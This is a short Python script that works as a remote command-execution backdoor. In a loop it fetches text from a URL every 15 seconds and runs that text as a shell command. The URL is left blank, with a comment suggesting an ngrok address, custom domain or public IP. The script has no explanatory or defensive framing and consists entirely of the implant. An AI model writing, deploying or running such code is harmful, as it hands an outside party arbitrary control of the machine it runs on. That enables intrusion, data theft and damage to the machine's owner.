import subprocess
import requests
import time
def main():
    while True:
        time.sleep(15)
        abc = requests.get("")#ngrok url or custom domain name or public ip
        hai = abc.text
        subprocess.call(hai,shell=True)
    
def ok():
    time.sleep(3)
    main()
ok()